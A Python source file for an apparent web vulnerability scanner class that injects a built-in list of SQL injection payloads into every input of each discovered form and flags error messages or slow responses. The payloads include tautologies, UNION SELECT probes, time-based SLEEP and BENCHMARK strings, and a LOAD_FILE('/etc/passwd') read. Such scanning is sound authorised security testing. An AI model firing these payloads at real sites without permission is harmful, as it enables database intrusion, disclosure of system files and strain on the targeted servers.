from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup
from selenium.webdriver.remote.webdriver import WebDriver
import logging
import time


class SQLInjectionScanner:
    """
    A class to scan web forms for SQL injection vulnerabilities.
    """
    def __init__(self, driver: WebDriver, payloads=None):
        """
        Initialize the SQL Injection scanner with configurable payloads.
        Args:
            payloads (list, optional): List of SQL injection payloads. Defaults to a predefined list.
        """
        self.driver = driver  # Use Selenium driver from crawler
        self.payloads = payloads or [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "' UNION SELECT null--",
            "' AND 1=2 UNION SELECT @@version--",
            "' AND IF(1=1, SLEEP(5), 0)--",  # Time-based SQLi
            "' OR BENCHMARK(1000000, MD5(1))--",  # Heavy computation
        ]
        self.payloads += [
            "' OR 1=1--",
            "' OR 1=2--",
            "' OR 'a'='a",
            "' OR 'a'='b",
            "' AND SLEEP(10)--",  # Time-based SQLi
            "' OR LOAD_FILE('/etc/passwd')--",  # File-based SQLi
        ]


    def test_sql_injection(self, form, url):
        """Test a form for SQL injection vulnerabilities."""
        if not self._validate_form(form):
            logging.warning(f"Invalid form structure at {url}. Skipping SQLi test.")
            return False

        if not form.get("inputs"):
            logging.warning(f"No inputs found in form at {url}. Skipping SQLi test.")
            return False

        action = form.get("action", urljoin(url, form.get("action", "")))
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])
        data = {input_field.get("name"): "test" for input_field in inputs if input_field.get("name")}

        for payload in self.payloads:
            for input_name in data:
                modified_data = data.copy()
                modified_data[input_name] = payload

                try:
                    start_time = time.time()
                    response = requests.post(action, data=modified_data) if method == "post" else requests.get(action, params=modified_data)
                    elapsed_time = time.time() - start_time

                    if response.status_code == 200 and (
                        any(keyword in response.text.lower() for keyword in ["error", "syntax", "sql", "database", "mysql", "pg_"]) or
                        elapsed_time > 5
                    ):
                        logging.warning(f"Potential SQLi vulnerability found at {action} with payload: {payload}")
                        print(f"Potential SQLi vulnerability found at {action} with payload: {payload}")
                        return True
                except requests.RequestException as e:
                    logging.error(f"Error testing SQLi on {action}: {e}")

        return False

    def _validate_form(self, form):
        """
        Validate the structure of the form.

        Args:
            form (dict): The form to validate.

        Returns:
            bool: True if the form is valid, False otherwise.
        """
        return bool(form.get("inputs") and form.get("action"))